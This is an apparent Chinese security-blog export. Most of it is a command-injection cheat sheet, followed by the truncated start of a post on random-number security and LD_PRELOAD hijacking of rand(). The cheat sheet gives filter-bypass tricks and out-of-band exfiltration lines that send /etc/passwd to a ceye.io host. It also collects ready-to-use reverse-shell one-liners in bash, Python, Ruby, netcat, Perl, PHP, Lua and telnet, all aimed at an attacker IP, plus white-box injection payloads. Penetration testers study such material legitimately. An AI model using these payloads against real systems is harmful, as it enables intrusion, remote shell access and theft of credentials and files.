<h3 id="感叹号"><a href="#感叹号" class="headerlink" title="!!(感叹号)"></a>!!(感叹号)</h3><p>​    执行上一条指令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# !!</span><br><span class="line">echo '$USER'</span><br><span class="line"><span class="meta">$</span><span class="bash">USER</span></span><br></pre></td></tr></table></figure>

<h3 id="指令群组"><a href="#指令群组" class="headerlink" title="()指令群组"></a>()指令群组</h3><p>​    格式为： (command1;command2[;command3…]) </p>
<ul>
<li>一条命令需要独占一个物理行，如果需要将多条命令放在同一行，命令之间使用命令分隔符（;）分隔</li>
<li>执行的效果等同于多个独立的命令单独执行的效果。表示在当前 shell 中将多个命令作为一个整体执行</li>
<li>命令组合常和命令执行控制结合起来使用。用括号将一串连续指令括起来，这种用法对shell来说，称为指令群组</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# (cd /home; path=`pwd` ;echo $path)</span><br><span class="line">/home</span><br><span class="line">root@kali:~# pwd</span><br><span class="line">/root</span><br></pre></td></tr></table></figure>

<h3 id="（大括号）"><a href="#（大括号）" class="headerlink" title="{}（大括号）"></a>{}（大括号）</h3><p>​    拼接字符串</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# cat &#123;test,test.tx&#125;&#123;.txt,t&#125;</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">cat: testt: No such file or directory</span><br><span class="line">cat: test.tx.txt: No such file or directory</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">root@kali:~# ls</span><br><span class="line">1  test  test.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#123;OS_COMMAND,ARGUMENT&#125;</span></span><br><span class="line">root@kali:~# &#123;cat,test.txt&#125;</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h3 id="（中括号）"><a href="#（中括号）" class="headerlink" title="[]（中括号）"></a>[]（中括号）</h3><ul>
<li><p>常出现在流程控制中，扮演括住判断式的作用</p>
</li>
<li><p>if [ “$?” != 0 ] then echo “Executes error” exit 1 fi</p>
</li>
<li><p>这个符号在正则表达式中担任类似 “范围” 或 “集合” 的角色</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# cat te[a-z]t.txt</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h3 id="输入输出-重定向"><a href="#输入输出-重定向" class="headerlink" title="输入输出/重定向"></a>输入输出/重定向</h3><p>​    <code>&gt;</code>      <code>&gt;&gt;</code>   <code>&lt;</code>   <code>&lt;&lt;</code>   <code>:&gt;</code>   <code>&amp;&gt;</code>   <code>&gt;&amp;</code> <code>2&amp;&gt;</code>   <code>2&lt;&gt;&gt;&amp;</code>   <code>&gt;&amp;2</code></p>
<table>
<thead>
<tr>
<th><strong>文件描述符</strong></th>
<th><strong>名称</strong></th>
<th><strong>常用缩写</strong></th>
<th><strong>默认值</strong></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>标准输入</td>
<td>stdin</td>
<td>键盘</td>
</tr>
<tr>
<td>1</td>
<td>标准输出</td>
<td>stdout</td>
<td>屏幕</td>
</tr>
<tr>
<td>2</td>
<td>标准错误输出</td>
<td>stderr</td>
<td>屏幕</td>
</tr>
</tbody></table>
<ul>
<li><p>&amp;&gt; file 表示把 标准输出 和 标准错误输出 都重定向到文件 file 中</p>
</li>
<li><p>&gt;&amp; file  把标准输出和标准错误输出都重定向到文件 file, 由于 &gt; 默认为重定向标准输出，所以和 1&gt;&amp; file 是一个意思</p>
</li>
</ul>
<p>命令说明:</p>
<ul>
<li>cmd &gt; file把cmd命令的输出重定向到文件file中。如果file已经存在，则清空原有文件，使用bash的noclobber选项可以防止复盖原有文件</li>
<li>cmd &gt;&gt; file把cmd命令的输出重定向到文件file中，如果file已经存在，则把信息加在原有文件后面</li>
<li>cmd &lt; file使cmd命令从file读入</li>
<li>cmd &lt;&lt; text 从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用&lt;&lt;- ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容</li>
<li>cmd &lt;&lt;&lt; word把word（而不是文件word）和后面的换行作为输入提供给cmd</li>
<li>cmd &lt;&gt; file以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的</li>
<li>cmd &gt;| file功能同&gt;，但即便在设置了noclobber时也会复盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用&gt;!实现这一功能</li>
<li>: &gt; filename把文件filename截断为0长度。如果文件不存在, 那么就创建一个0长度的文件(与touch的效果相同)</li>
<li>cmd &gt;&amp;n把输出送到文件描述符n</li>
<li>cmd m&gt;&amp;n把输出到文件符m的信息重定向到文件描述符n</li>
<li>cmd &gt;&amp;-关闭标准输出</li>
<li>cmd &lt;&amp;n输入来自文件描述符n</li>
<li>cmd m&lt;&amp;nm来自文件描述各个n</li>
<li>cmd &lt;&amp;-关闭标准输入</li>
<li>cmd &lt;&amp;n-移动输入文件描述符n而非复制它</li>
<li>cmd &gt;&amp;n-移动输出文件描述符n而非复制它</li>
</ul>
<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><table>
<thead>
<tr>
<th><strong>字符</strong></th>
<th><strong>解释</strong></th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>匹配任意长度任意字符</td>
</tr>
<tr>
<td>?</td>
<td>匹配任意单个字符</td>
</tr>
<tr>
<td>[list]</td>
<td>匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td>
</tr>
<tr>
<td>[^list]</td>
<td>匹配指定范围外的任意单个字符或字符集合</td>
</tr>
<tr>
<td>{str1,str2,…}</td>
<td>匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td>
</tr>
<tr>
<td>IFS</td>
<td>由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成</td>
</tr>
<tr>
<td>CR</td>
<td>由 &lt; enter &gt; 产生</td>
</tr>
<tr>
<td>!</td>
<td>执行 history 中的命令</td>
</tr>
</tbody></table>
<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="执行多条命令"><a href="#执行多条命令" class="headerlink" title="执行多条命令"></a>执行多条命令</h3><ul>
<li>unix： %0a、%0d、;、&amp;、|、$(shell_command)、<code>shell_command</code>、{shell_command,}</li>
<li>在windows上:%0a、&amp;、|、%1a 作为.bat文件中的命令分隔符</li>
</ul>
<hr>
<ul>
<li>回车 代码：CR ASCII码：\ r ，十六进制，0x0d 回车的作用只是移动光标至该行的起始位置</li>
<li>换行 代码：LF ASCII码：\ n ，十六进制，0x0a 换行至下一行行首起始位置</li>
</ul>
<hr>
<p> <strong>一个DEMO</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; escapeshellcmd 除去字符串中的特殊符号 </span><br><span class="line">&lt;?php</span><br><span class="line">    $command &#x3D; &#39;dir&amp;&#39;;</span><br><span class="line">    var_dump($command);</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    $escaped_command &#x3D; escapeshellcmd($command);</span><br><span class="line">    var_dump($escaped_command);</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    file_put_contents(&#39;out.bat&#39;,$escaped_command);</span><br><span class="line">    system(&#39;out.bat&#39;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">string(4) &quot;dir&amp;&quot;</span><br><span class="line">string(5) &quot;dir^&amp;&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $command &#x3D; &#39;dir&#39;.$_GET[&quot;dir&quot;];</span><br><span class="line">    var_dump($command);</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    $escaped_command &#x3D; escapeshellcmd($command);</span><br><span class="line">    var_dump($escaped_command);</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    file_put_contents(&#39;out.bat&#39;,$escaped_command);</span><br><span class="line">    system(&#39;out.bat&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>%1a 绕过</p>
<p><img data-src="./%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5&&%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/1.png" alt></p>
<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ul>
<li>使用&lt;或者&lt;&gt;</li>
<li>使用IFS cat$IFS$9test 、cat${IFS}test</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# echo "begin$IFS$9end"</span><br><span class="line">begin 	</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<ul>
<li>url编码绕过，Linux bash可以使用%20(space)、%09(tab)、%3c(&lt;)以及+来绕过</li>
<li>花括号拓展{OS_COMMAND,ARGUMENT}，在Linux bash中还可以使用{cat,/tmp/test}来绕过</li>
<li>变量控制 a=$’cat\x20test’ &amp;&amp; $a</li>
<li>$@ $* 绕过 echo whoa$@mi|$0 echo i$<em>d|$0  ($@ $\</em> 当前shell中的参数 $@保留参数中的空白)</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# cat$IFS$9test</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kali:~# cat$&#123;IFS&#125;test</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kali:~# &#123;cat,test&#125;</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kali:~# a=$'cat\x20test' &amp;&amp; $a</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">root@kali:~# a=$'cat\x09test' &amp;&amp; $a</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">root@kali:~# echo whoa$@mi|$0</span><br><span class="line">root</span><br><span class="line">root@kali:~# echo i$*d|$0</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3><ul>
<li>变量绕过 <code>a=c;b=at;c=test;$a$b $c</code>、<code>a=i;b=d;$a$b</code></li>
<li>编码绕过 可尝试base64、16进制、8进制<br><code>echo &quot;Y2F0IC90bXAvdGVzdA==&quot;|base64 -d|bash</code><br><code>$(printf &quot;\x63\x61\x74\x20\x2F\x74\x6D\x70\x2F\x74\x65\x73\x74&quot;)</code><br><code>echo &quot;636174202F746D702F74657374&quot; | xxd -r -p|bash</code></li>
<li>单引号双引号 <code>c&#39;a&#39;t /root/t&#39;&#39;e&#39;s&#39;t</code>、<code>c&quot;a&quot;t /root/t&#39;&#39;e&#39;s&#39;t</code></li>
<li>反斜杠 <code>c\a\t t\e\st</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# a=c;b=at;c=test;$a$b $c</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kali:~# a=i;b=d;$a$b</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kali:~# echo "Y2F0IC90bXAvdGVzdA=="|base64 -d|bash</span><br><span class="line">cat: /tmp/test: No such file or directory</span><br><span class="line">root@kali:~# id &gt;&gt;/tmp/test</span><br><span class="line">root@kali:~# echo "Y2F0IC90bXAvdGVzdA=="|base64 -d|bash</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kali:~# $(printf "\x63\x61\x74\x20\x2F\x74\x6D\x70\x2F\x74\x65\x73\x74")</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kali:~# echo "636174202F746D702F74657374" | xxd -r -p|bash</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kali:~# c'a't /root/t''e's't</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kali:~# c"a"t /root/t''e's't</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kali:~# c\a\t t\e\st</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<ul>
<li>利用已经存在的资源 <code>cat$IFS$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)tmp$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)test</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# cat$IFS$(expr$&#123;IFS&#125;substr$&#123;IFS&#125;$PWD$&#123;IFS&#125;1$&#123;IFS&#125;1)tmp$(expr$&#123;IFS&#125;substr$&#123;IFS&#125;$PWD$&#123;IFS&#125;1$&#123;IFS&#125;1)test</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<ul>
<li>利用已有字符<ul>
<li>${PS2} 对应字符 &gt;</li>
<li>${PS4} 对应字符 +</li>
<li>${IFS} 对应 内部字段分隔符</li>
<li>${9} 对应 空字符串</li>
</ul>
</li>
</ul>
<h2 id="无回显命令注入"><a href="#无回显命令注入" class="headerlink" title="无回显命令注入"></a>无回显命令注入</h2><h3 id="DNS-LOG外带"><a href="#DNS-LOG外带" class="headerlink" title="DNS LOG外带"></a>DNS LOG外带</h3><p>​    DNS的解析是递归与迭代相结合的，访问一个根域的时候DNS的解析过程示意图,其中红色部分是可控的,我们只需要搭建一个红色部分的DNS服务器，并将要盲打或盲注的回显，放到自己域名的二级甚至三级域名上去请求，就可以通过DNS解析日志来获取到它们</p>
<p>​    对于一些命令盲注类的漏洞，通常出站DNS流量不会被阻止可以通过，DNSLog 中的 WebLog 部分将其转化为有回显的命令执行</p>
<p><img data-src="./%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5&&%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/2.png" alt></p>
<h3 id="CEYE外带"><a href="#CEYE外带" class="headerlink" title="CEYE外带"></a>CEYE外带</h3><p>CEYE是创宇开放的一个网站，用来检测带外（Out-of-Band）流量的监控平台，如DNS查询和HTTP请求，它可以帮助安全研究人员在测试漏洞时收集信息（例如SSRF/XXE/RFI/RCE）</p>
<ul>
<li>漏洞检测或漏洞利用需要进一步的用户或系统交互</li>
<li>一些漏洞类型没有直接表明攻击是成功的。如Payload触发了却不在前端页面显示</li>
</ul>
<h3 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h3><p><a href="http://ceye.io/payloads" target="_blank" rel="noopener">http://ceye.io/payloads</a></p>
<ul>
<li>unix:<br>curl <a href="http://ip.port.xxxx.ceye.io/`whoami`" target="_blank" rel="noopener">http://ip.port.xxxx.ceye.io/`whoami`</a><br>ping <code>whoami</code>.ip.port.xxxx.ceye.io </li>
<li>windows<br>ping %USERNAME%.xxxx.ceye.io</li>
</ul>
<h2 id="常用反弹shell整理"><a href="#常用反弹shell整理" class="headerlink" title="常用反弹shell整理"></a>常用反弹shell整理</h2><ul>
<li>攻击机命令 <code>nc -lvvp port</code></li>
</ul>
<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c "sh &gt;%26 /dev/tcp/192.168.101.130/8888 0&gt;%261"</span><br><span class="line"></span><br><span class="line">/bin/bash -c '/bin/sh -i &gt; /dev/tcp/192.168.101.130/8888 2&gt;%261 0&gt;%261'</span><br></pre></td></tr></table></figure>

<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.101.130",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python -c <span class="string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('192.168.101.130',8888))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span></span><br></pre></td></tr></table></figure>

<h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("192.168.101.130","8888");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("192.168.101.130",8888).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>

<h3 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.101.130 8888　#不同版本的nc不一定支持-e选项</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 不能使用-e选项时：</span></span><br><span class="line">/bin/sh | nc 192.168.101.130 8888</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p %26%26 nc 192.168.101.130 8888 0/tmp/mknod backpipe p %26%26 telnet 192.168.101.130 8888 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="192.168.101.130";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;%26S");open(STDOUT,"&gt;%26S");open(STDERR,"&gt;%26S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>

<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("192.168.101.130",8888);exec("/bin/sh -i &lt;%263 &gt;%263 2&gt;%263");'</span></span><br></pre></td></tr></table></figure>

<h3 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h3><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('192.168.101.130','8888');os.execute('/bin/sh -i &lt;%263 &gt;%263 2&gt;%263');"</span></span><br></pre></td></tr></table></figure>

<h3 id="telnnet"><a href="#telnnet" class="headerlink" title="telnnet"></a>telnnet</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<h3 id="外带数据"><a href="#外带数据" class="headerlink" title="外带数据"></a>外带数据</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://znu8fe.ceye.io -F a=@/etc/passwd</span><br><span class="line"></span><br><span class="line">dir=wget --post-data="`cat /etc/passwd`" http://znu8fe.ceye.io</span><br><span class="line">telnet 192.168.101.130 8888 &lt; /etc/passwd</span><br><span class="line">cat xxx.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done</span><br></pre></td></tr></table></figure>

<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP常用命令执行函数</span><br><span class="line">dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link</span><br></pre></td></tr></table></figure>

<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>​    标准库命令执行危险模块</p>
<ul>
<li>os     os.system,os.popen</li>
<li>commands     commands.getoutput,commands.getstatusoutput</li>
<li>subprocess      subprocess.call,subprocess.Popen</li>
<li>pty   pty.spawn</li>
</ul>
<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment"># perl命令执行函数</span></span><br><span class="line"><span class="keyword">exec</span>、<span class="keyword">system</span>、反引号</span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码执行函数</span></span><br><span class="line"><span class="keyword">eval</span></span><br></pre></td></tr></table></figure>

<h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ExeShellCmd,SystemEx</span><br></pre></td></tr></table></figure>

<h2 id="白盒payload"><a href="#白盒payload" class="headerlink" title="白盒payload"></a>白盒payload</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、`id&gt;&gt;/tmp/ggg`</span><br><span class="line">2、`id&gt;ggg`</span><br><span class="line">3、$(id&gt;ggg)</span><br><span class="line">4、;`id&gt;&gt;/tmp/ggg`</span><br><span class="line">5、;`$(touch$(expr$&#123;IFS&#125;substr$&#123;IFS&#125;$PWD$&#123;IFS&#125;1$&#123;IFS&#125;1)tmp$(expr$&#123;IFS&#125;substr$&#123;IFS&#125;$PWD$&#123;IFS&#125;1$&#123;IFS&#125;1)ggg)`</span><br><span class="line">6、||id|tee ggg</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>任意命令执行</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>随机数安全浅析</title>
    <url>/2021/01/16/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h1 id="随机数安全浅析"><a href="#随机数安全浅析" class="headerlink" title="随机数安全浅析"></a>随机数安全浅析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    开发过程中，诸如初始密码生成，<code>session_id</code>生成等都需要生成一个随机值，如果未考虑到随机数安全，那么业务会被攻克，本文浅析随机数安全</p>
<a id="more"></a>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>​    主要介绍：</p>
<ul>
<li><code>LD_PRELOAD</code>使<code>rand()</code>函数不在随机</li>
<li><code>PHP</code>伪随机数的安全</li>
</ul>
<h3 id="使用LD-PRELOAD来劫持rand-函数"><a href="#使用LD-PRELOAD来劫持rand-函数" class="headerlink" title="使用LD_PRELOAD来劫持rand()函数"></a>使用LD_PRELOAD来劫持rand()函数</h3><p>​    <code>LD_PRELOAD</code>是一个环境变量，用于动态库的加载，优先级最高</p>
<p>​    一般情况下，加载顺序为<code>LD_PRELOAD</code>&gt;<code>LD_LIBRARY_PATH</code>&gt;<code>/etc/ld.so.cache</code>&gt;<code>/lib&gt;/usr/lib</code></p>
<p>​    如果我们自定义库函数，并编译成动态库后，通过<code>LD_PRELOAD</code>加载后，调取的是自定义函数</p>
<ul>
<li>分析<code>git</code>仓<code>LD_PRELOAD-rand-Hijack-Example</code>(<a href="https://github.com/ProfessionallyEvil/LD_PRELOAD-rand-Hijack-Example" target="_blank" rel="noopener">https://github.com/ProfessionallyEvil/LD_PRELOAD-rand-Hijack-Example</a>)</li>
</ul>
<h4 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h4><ul>
<li><code>guessing_game.c</code>就是生成一个随机数，和用户输入进行比较，如果不相等则输出<code>You lose</code>,相等输出<code>You Win!</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// guessing_game.c</span></span><br><span class="line"><span class="comment">/***********************************************************************</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Project: guessing_game</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Author: Travis Phillips</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Date: 10/24/2020</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Project Repo:</span></span><br><span class="line"><span class="comment"> *  https://github.com/ProfessionallyEvil/LD_PRELOAD-rand-Hijack-Example</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Purpose: This is code for a simple random number guessing game for</span></span><br><span class="line"><span class="comment"> *          a blog post on using LD_PRELOAD to hijack functions in an</span></span><br><span class="line"><span class="comment"> *          application, in this case, hijacking rand()</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Compile: gcc guessing_game.c -o guessing_game</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment">***********************************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////</span></span><br><span class="line"><span class="comment">// App Constants</span></span><br><span class="line"><span class="comment">/////////////////////////////////</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *TITLE = <span class="string">"Number Guessing Game"</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *VER = <span class="string">"v1.0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////</span></span><br><span class="line"><span class="comment">// Color Constants</span></span><br><span class="line"><span class="comment">/////////////////////////////////</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NOCOLOR</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *RED = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *GREEN = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *YELLOW = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *NC = <span class="string">""</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *RED = <span class="string">"\033[31;1m"</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *GREEN = <span class="string">"\033[32;1m"</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *YELLOW = <span class="string">"\033[33;1m"</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *NC = <span class="string">"\033[0m"</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// Initalize Variables.</span></span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> rand_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> user_guess = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">time_t</span> t = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// Print the banner.</span></span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t%s---===[ %s %s ]===---%s\n\n"</span>, YELLOW, TITLE, VER, NC);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// Get the user's guess.</span></span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">" [?] Guess a number between 0-31337 &gt; "</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;user_guess) || user_guess &gt; <span class="number">31337</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" [%s!%s] %sERROR:%s Invalid input.\n\n"</span>, RED, NC, RED, NC);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span 